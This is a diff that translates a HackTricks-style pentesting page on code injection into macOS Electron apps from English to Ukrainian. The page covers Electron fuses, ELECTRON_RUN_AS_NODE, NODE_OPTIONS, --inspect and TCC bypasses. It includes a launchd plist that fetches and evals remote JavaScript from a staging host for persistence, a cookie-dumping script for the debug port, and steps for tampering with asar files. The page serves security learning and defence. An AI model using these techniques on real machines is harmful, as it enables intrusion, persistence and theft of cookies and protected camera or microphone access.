@@ -4,130 +4,117 @@
 
 ## Basic Information
 
-If you don't know what Electron is you can find [**lots of information here**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). But for now just know that Electron runs **node**.\
-And node has some **parameters** and **env variables** that can be use to **make it execute other code** apart from the indicated file.
+Якщо ви не знаєте, що таке Electron, ви можете знайти [**багато інформації тут**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Але поки просто знайте, що Electron запускає **node**.\
+А node має деякі **параметри** та **змінні середовища**, які можна використовувати для **виконання іншого коду** окрім вказаного файлу.
 
 ### Electron Fuses
 
-These techniques will be discussed next, but in recent times Electron has added several **security flags to prevent them**. These are the [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) and these are the ones used to **prevent** Electron apps in macOS from **loading arbitrary code**:
+Ці техніки будуть обговорені далі, але в останні часи Electron додав кілька **параметрів безпеки для їх запобігання**. Це [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) і це ті, що використовуються для **запобігання** завантаженню Electron додатків в macOS **произвольного коду**:
 
-- **`RunAsNode`**: If disabled, it prevents the use of the env var **`ELECTRON_RUN_AS_NODE`** to inject code.
-- **`EnableNodeCliInspectArguments`**: If disabled, params like `--inspect`, `--inspect-brk` won't be respected. Avoiding his way to inject code.
-- **`EnableEmbeddedAsarIntegrityValidation`**: If enabled, the loaded **`asar`** **file** will be **validated** by macOS. **Preventing** this way **code injection** by modifying the contents of this file.
-- **`OnlyLoadAppFromAsar`**: If this is enabled, instead of searching to load in the following order: **`app.asar`**, **`app`** and finally **`default_app.asar`**. It will only check and use app.asar, thus ensuring that when **combined** with the **`embeddedAsarIntegrityValidation`** fuse it is **impossible** to **load non-validated code**.
-- **`LoadBrowserProcessSpecificV8Snapshot`**: If enabled, the browser process uses the file called `browser_v8_context_snapshot.bin` for its V8 snapshot.
+- **`RunAsNode`**: Якщо вимкнено, заважає використанню змінної середовища **`ELECTRON_RUN_AS_NODE`** для ін'єкції коду.
+- **`EnableNodeCliInspectArguments`**: Якщо вимкнено, параметри, такі як `--inspect`, `--inspect-brk`, не будуть враховані. Уникаючи таким чином ін'єкції коду.
+- **`EnableEmbeddedAsarIntegrityValidation`**: Якщо увімкнено, завантажений **`asar`** **файл** буде **перевірений** macOS. **Запобігаючи** таким чином **ін'єкції коду** шляхом модифікації вмісту цього файлу.
+- **`OnlyLoadAppFromAsar`**: Якщо це увімкнено, замість того, щоб шукати завантаження в наступному порядку: **`app.asar`**, **`app`** і нарешті **`default_app.asar`**. Він перевірятиме та використовуватиме лише app.asar, таким чином забезпечуючи, що при **поєднанні** з параметром **`embeddedAsarIntegrityValidation`** неможливо **завантажити неперевірений код**.
+- **`LoadBrowserProcessSpecificV8Snapshot`**: Якщо увімкнено, процес браузера використовує файл під назвою `browser_v8_context_snapshot.bin` для свого V8 знімка.
 
-Another interesting fuse that won't be preventing code injection is:
+Ще один цікавий параметр, який не запобігатиме ін'єкції коду:
 
-- **EnableCookieEncryption**: If enabled, the cookie store on disk is encrypted using OS level cryptography keys.
+- **EnableCookieEncryption**: Якщо увімкнено, сховище куків на диску шифрується за допомогою криптографічних ключів на рівні ОС.
 
 ### Checking Electron Fuses
 
-You can **check these flags** from an application with:
-
+Ви можете **перевірити ці параметри** з програми за допомогою:
 ```bash
 npx @electron/fuses read --app /Applications/Slack.app
 
 Analyzing app: Slack.app
 Fuse Version: v1
-  RunAsNode is Disabled
-  EnableCookieEncryption is Enabled
-  EnableNodeOptionsEnvironmentVariable is Disabled
-  EnableNodeCliInspectArguments is Disabled
-  EnableEmbeddedAsarIntegrityValidation is Enabled
-  OnlyLoadAppFromAsar is Enabled
-  LoadBrowserProcessSpecificV8Snapshot is Disabled
+RunAsNode is Disabled
+EnableCookieEncryption is Enabled
+EnableNodeOptionsEnvironmentVariable is Disabled
+EnableNodeCliInspectArguments is Disabled
+EnableEmbeddedAsarIntegrityValidation is Enabled
+OnlyLoadAppFromAsar is Enabled
+LoadBrowserProcessSpecificV8Snapshot is Disabled
 ```
+### Модифікація електронних запобіжників
 
-### Modifying Electron Fuses
+Як згадують [**документи**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), конфігурація **електронних запобіжників** налаштовується всередині **бінарного файлу Electron**, який містить десь рядок **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
 
-As the [**docs mention**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), the configuration of the **Electron Fuses** are configured inside the **Electron binary** which contains somewhere the string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.
-
-In macOS applications this is typically in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
-
+У macOS додатках це зазвичай знаходиться в `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
 ```bash
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-
-You could load this file in [https://hexed.it/](https://hexed.it/) and search for the previous string. After this string you can see in ASCII a number "0" or "1" indicating if each fuse is disabled or enabled. Just modify the hex code (`0x30` is `0` and `0x31` is `1`) to **modify the fuse values**.
+Ви можете завантажити цей файл на [https://hexed.it/](https://hexed.it/) і шукати попередній рядок. Після цього рядка ви можете побачити в ASCII число "0" або "1", що вказує, чи кожен запобіжник вимкнений чи увімкнений. Просто змініть шістнадцятковий код (`0x30` - це `0`, а `0x31` - це `1`), щоб **змінити значення запобіжників**.
 
 <figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>
 
-Note that if you try to **overwrite** the **`Electron Framework` binary** inside an application with these bytes modified, the app won't run.
+Зверніть увагу, що якщо ви спробуєте **перезаписати** бінарний файл **`Electron Framework`** всередині програми з цими зміненими байтами, програма не запуститься.
 
-## RCE adding code to Electron Applications
+## RCE додавання коду до Electron Applications
 
-There could be **external JS/HTML files** that an Electron App is using, so an attacker could inject code in these files whose signature won't be checked and execute arbitrary code in the context of the app.
+Можуть бути **зовнішні JS/HTML файли**, які використовує Electron App, тому зловмисник може впровадити код у ці файли, підпис яких не буде перевірятися, і виконати довільний код в контексті програми.
 
 > [!CAUTION]
-> However, at the moment there are 2 limitations:
+> Однак на даний момент існує 2 обмеження:
 >
-> - The **`kTCCServiceSystemPolicyAppBundles`** permission is **needed** to modify an App, so by default this is no longer possible.
-> - The compiled **`asap`** file usually has the fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** `enabled`
+> - Дозвіл **`kTCCServiceSystemPolicyAppBundles`** є **необхідним** для зміни програми, тому за замовчуванням це більше не можливо.
+> - Скомпільований файл **`asap`** зазвичай має запобіжники **`embeddedAsarIntegrityValidation`** `та` **`onlyLoadAppFromAsar`** `увімкненими`
 >
-> Making this attack path more complicated (or impossible).
+> Це ускладнює (або робить неможливим) цей шлях атаки.
 
-Note that it's possible to bypass the requirement of **`kTCCServiceSystemPolicyAppBundles`** by copying the application to another directory (like **`/tmp`**), renaming the folder **`app.app/Contents`** to **`app.app/NotCon`**, **modifying** the **asar** file with your **malicious** code, renaming it back to **`app.app/Contents`** and executing it.
+Зверніть увагу, що можна обійти вимогу **`kTCCServiceSystemPolicyAppBundles`**, скопіювавши програму в інший каталог (наприклад, **`/tmp`**), перейменувавши папку **`app.app/Contents`** на **`app.app/NotCon`**, **змінивши** файл **asar** з вашим **шкідливим** кодом, перейменувавши його назад на **`app.app/Contents`** і виконуючи його.
 
-You can unpack the code from the asar file with:
-
+Ви можете розпакувати код з файлу asar за допомогою:
 ```bash
 npx asar extract app.asar app-decomp
 ```
-
-And pack it back after having modified it with:
-
+І запакуйте його назад після внесення змін з:
 ```bash
 npx asar pack app-decomp app-new.asar
 ```
+## RCE з `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
-## RCE with `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
-
-According to [**the docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), if this env variable is set, it will start the process as a normal Node.js process.
-
+Згідно з [**документацією**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), якщо ця змінна середовища встановлена, процес буде запущено як звичайний процес Node.js.
 ```bash
 # Run this
 ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 # Then from the nodeJS console execute:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
-
 > [!CAUTION]
-> If the fuse **`RunAsNode`** is disabled the env var **`ELECTRON_RUN_AS_NODE`** will be ignored, and this won't work.
+> Якщо запобіжник **`RunAsNode`** вимкнено, змінна середовища **`ELECTRON_RUN_AS_NODE`** буде проігнорована, і це не спрацює.
 
-### Injection from the App Plist
+### Ін'єкція з App Plist
 
-As [**proposed here**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), you could abuse this env variable in a plist to maintain persistence:
-
+Як [**пропонується тут**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), ви можете зловживати цією змінною середовища в plist для підтримки постійності:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-    <key>EnvironmentVariables</key>
-    <dict>
-           <key>ELECTRON_RUN_AS_NODE</key>
-           <string>true</string>
-    </dict>
-    <key>Label</key>
-    <string>com.xpnsec.hideme</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
-        <string>-e</string>
-        <string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
-    </array>
-    <key>RunAtLoad</key>
-    <true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>ELECTRON_RUN_AS_NODE</key>
+<string>true</string>
+</dict>
+<key>Label</key>
+<string>com.xpnsec.hideme</string>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+<string>-e</string>
+<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
+</array>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 </plist>
 ```
+## RCE з `NODE_OPTIONS`
 
-## RCE with `NODE_OPTIONS`
-
-You can store the payload in a different file and execute it:
-
+Ви можете зберегти корисне навантаження в іншому файлі та виконати його:
 ```bash
 # Content of /tmp/payload.js
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');
@@ -135,52 +122,46 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 # Execute
 NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
 ```
-
 > [!CAUTION]
-> If the fuse **`EnableNodeOptionsEnvironmentVariable`** is **disabled**, the app will **ignore** the env var **NODE_OPTIONS** when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
+> Якщо запобіжник **`EnableNodeOptionsEnvironmentVariable`** є **вимкненим**, додаток **ігноруватиме** змінну середовища **NODE_OPTIONS** під час запуску, якщо змінна середовища **`ELECTRON_RUN_AS_NODE`** не встановлена, яка також буде **ігноруватися**, якщо запобіжник **`RunAsNode`** вимкнений.
 >
-> If you don't set **`ELECTRON_RUN_AS_NODE`** , you will find the **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
+> Якщо ви не встановите **`ELECTRON_RUN_AS_NODE`**, ви отримаєте **помилку**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
 
-### Injection from the App Plist
+### Впровадження з App Plist
 
-You could abuse this env variable in a plist to maintain persistence adding these keys:
-
+Ви можете зловживати цією змінною середовища в plist для підтримки постійності, додавши ці ключі:
 ```xml
 <dict>
-    <key>EnvironmentVariables</key>
-    <dict>
-           <key>ELECTRON_RUN_AS_NODE</key>
-           <string>true</string>
-           <key>NODE_OPTIONS</key>
-           <string>--require /tmp/payload.js</string>
-    </dict>
-    <key>Label</key>
-    <string>com.hacktricks.hideme</string>
-    <key>RunAtLoad</key>
-    <true/>
+<key>EnvironmentVariables</key>
+<dict>
+<key>ELECTRON_RUN_AS_NODE</key>
+<string>true</string>
+<key>NODE_OPTIONS</key>
+<string>--require /tmp/payload.js</string>
+</dict>
+<key>Label</key>
+<string>com.hacktricks.hideme</string>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 ```
+## RCE з інспекцією
 
-## RCE with inspecting
-
-According to [**this**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), if you execute an Electron application with flags such as **`--inspect`**, **`--inspect-brk`** and **`--remote-debugging-port`**, a **debug port will be open** so you can connect to it (for example from Chrome in `chrome://inspect`) and you will be able to **inject code on it** or even launch new processes.\
-For example:
-
+Згідно з [**цією**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), якщо ви виконаєте додаток Electron з такими прапорами, як **`--inspect`**, **`--inspect-brk`** та **`--remote-debugging-port`**, **порт налагодження буде відкритий**, тому ви зможете підключитися до нього (наприклад, з Chrome у `chrome://inspect`) і ви зможете **впровадити код у нього** або навіть запустити нові процеси.\
+Наприклад:
 ```bash
 /Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
 # Connect to it using chrome://inspect and execute a calculator with:
 require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
 ```
-
 > [!CAUTION]
-> If the fuse **`EnableNodeCliInspectArguments`** is disabled, the app will **ignore node parameters** (such as `--inspect`) when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
+> Якщо запобіжник **`EnableNodeCliInspectArguments`** вимкнено, додаток **ігноруватиме параметри node** (такі як `--inspect`) під час запуску, якщо змінна середовища **`ELECTRON_RUN_AS_NODE`** не встановлена, яка також буде **ігноруватися**, якщо запобіжник **`RunAsNode`** вимкнено.
 >
-> However, you could still use the **electron param `--remote-debugging-port=9229`** but the previous payload won't work to execute other processes.
+> Однак ви все ще можете використовувати **електронний параметр `--remote-debugging-port=9229`**, але попередній payload не спрацює для виконання інших процесів.
 
-Using the param **`--remote-debugging-port=9222`** it's possible to steal some information from the Electron App like the **history** (with GET commands) or the **cookies** of the browser (as they are **decrypted** inside the browser and there is a **json endpoint** that will give them).
+Використовуючи параметр **`--remote-debugging-port=9222`**, можна вкрасти деяку інформацію з Electron App, таку як **історія** (з командами GET) або **куки** браузера (оскільки вони **дешифруються** всередині браузера і є **json endpoint**, який їх надасть).
 
-You can learn how to do that in [**here**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) and [**here**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) and use the automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) or a simple script like:
-
+Ви можете дізнатися, як це зробити [**тут**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) і [**тут**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) та використовувати автоматичний інструмент [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) або простий скрипт, як:
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -188,43 +169,39 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
+У [**цьому блозі**](https://hackerone.com/reports/1274695) це налагодження зловживається для того, щоб безголовий chrome **завантажував довільні файли в довільні місця**.
 
-In [**this blogpost**](https://hackerone.com/reports/1274695), this debugging is abused to make a headless chrome **download arbitrary files in arbitrary locations**.
+### Ін'єкція з App Plist
 
-### Injection from the App Plist
-
-You could abuse this env variable in a plist to maintain persistence adding these keys:
-
+Ви можете зловживати цією змінною середовища в plist для підтримки постійності, додавши ці ключі:
 ```xml
 <dict>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
-        <string>--inspect</string>
-    </array>
-    <key>Label</key>
-    <string>com.hacktricks.hideme</string>
-    <key>RunAtLoad</key>
-    <true/>
+<key>ProgramArguments</key>
+<array>
+<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
+<string>--inspect</string>
+</array>
+<key>Label</key>
+<string>com.hacktricks.hideme</string>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 ```
-
-## TCC Bypass abusing Older Versions
+## TCC Bypass зловживаючи старими версіями
 
 > [!TIP]
-> The TCC daemon from macOS doesn't check the executed version of the application. So if you **cannot inject code in an Electron application** with any of the previous techniques you could download a previous version of the APP and inject code on it as it will still get the TCC privileges (unless Trust Cache prevents it).
+> Демон TCC з macOS не перевіряє виконувану версію програми. Тому, якщо ви **не можете інжектувати код в Electron додаток** за допомогою будь-якої з попередніх технік, ви можете завантажити попередню версію APP і інжектувати код в неї, оскільки вона все ще отримає привілеї TCC (якщо тільки Trust Cache не завадить цьому).
 
-## Run non JS Code
+## Запуск не JS коду
 
-The previous techniques will allow you to run **JS code inside the process of the electron application**. However, remember that the **child processes run under the same sandbox profile** as the parent application and **inherit their TCC permissions**.\
-Therefore, if you want to abuse entitlements to access the camera or microphone for example, you could just **run another binary from the process**.
+Попередні техніки дозволять вам запускати **JS код всередині процесу електронного додатку**. Однак пам'ятайте, що **дочірні процеси працюють під тим же профілем пісочниці**, що й батьківський додаток, і **успадковують їхні TCC дозволи**.\
+Отже, якщо ви хочете зловживати правами доступу до камери або мікрофона, наприклад, ви можете просто **запустити інший бінар з процесу**.
 
-## Automatic Injection
+## Автоматичне інжектування
 
-The tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) can be easily used to **find vulnerable electron applications** installed and inject code on them. This tool will try to use the **`--inspect`** technique:
+Інструмент [**electroniz3r**](https://github.com/r3ggi/electroniz3r) можна легко використовувати для **пошуку вразливих електронних додатків**, які встановлені, і інжектування коду в них. Цей інструмент спробує використати техніку **`--inspect`**:
 
-You need to compile it yourself and can use it like this:
-
+Вам потрібно скомпілювати його самостійно і ви можете використовувати його так:
 ```bash
 # Find electron apps
 ./electroniz3r list-apps
@@ -260,8 +237,7 @@ You can now kill the app using `kill -9 57739`
 The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
 Shell binding requested. Check `nc 127.0.0.1 12345`
 ```
-
-## References
+## Посилання
 
 - [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
 - [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
